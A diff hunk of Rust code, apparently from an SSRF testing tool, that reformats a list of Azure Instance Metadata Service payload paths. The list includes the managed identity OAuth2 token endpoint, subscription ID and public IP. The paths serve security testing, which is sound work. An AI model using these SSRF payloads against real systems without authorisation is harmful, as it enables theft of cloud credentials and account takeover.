@@ -197,10 +197,22 @@ fn gcp_metadata_payloads() -> Vec<SsrfPayload> {
 
 fn azure_metadata_payloads() -> Vec<SsrfPayload> {
     let base_paths = [
-        ("/metadata/instance?api-version=2021-02-01", "instance metadata"),
-        ("/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "managed identity token"),
-        ("/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text", "subscription ID"),
-        ("/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2021-02-01&format=text", "public IP"),
+        (
+            "/metadata/instance?api-version=2021-02-01",
+            "instance metadata",
+        ),
+        (
+            "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+            "managed identity token",
+        ),
+        (
+            "/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text",
+            "subscription ID",
+        ),
+        (
+            "/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2021-02-01&format=text",
+            "public IP",
+        ),
     ];
 
     base_paths
